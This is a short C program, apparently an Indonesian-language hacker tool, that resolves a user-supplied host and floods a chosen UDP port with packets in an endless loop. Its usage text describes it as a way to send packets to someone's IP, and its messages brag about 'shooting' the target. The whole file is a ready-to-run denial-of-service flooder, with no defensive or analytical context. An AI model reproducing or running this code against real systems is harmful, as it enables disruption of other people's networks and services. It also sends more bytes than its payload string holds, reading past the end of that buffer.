#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#define JENIS_PELURU "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#define UKURAN_PELURU 45

int echo_connect(char *, short);
int echo_connect(char *server, short port)
{
struct sockaddr_in sin;
struct hostent *hp;
int thesock;
printf("\n");
printf("l33nux..!!!! Tembaaaak %s ke port %d\n",
server, port);
hp = gethostbyname(server);
if (hp==NULL) {
printf("Di %s gak ada sasaran, Boss!!\n",server);
printf("\n");
exit(0);
}
bzero((char*) &sin, sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = htons(port);
sin.sin_family = hp->h_addrtype;
sin.sin_port = htons(port);
thesock = socket(AF_INET, SOCK_DGRAM, 0);
connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
return thesock;
}


main(int argc, char **argv)
{
int s;
if(argc != 3)
{
printf("\n");
printf("Kirim Paket ke IP orang\n\n");
printf("Cara Pake : $ tembak hostname.orang port \n\n");
exit(0);
}
s=echo_connect(argv[1], atoi(argv[2]));
for(;;)
{
send(s, JENIS_PELURU, UKURAN_PELURU, 0);
}
}



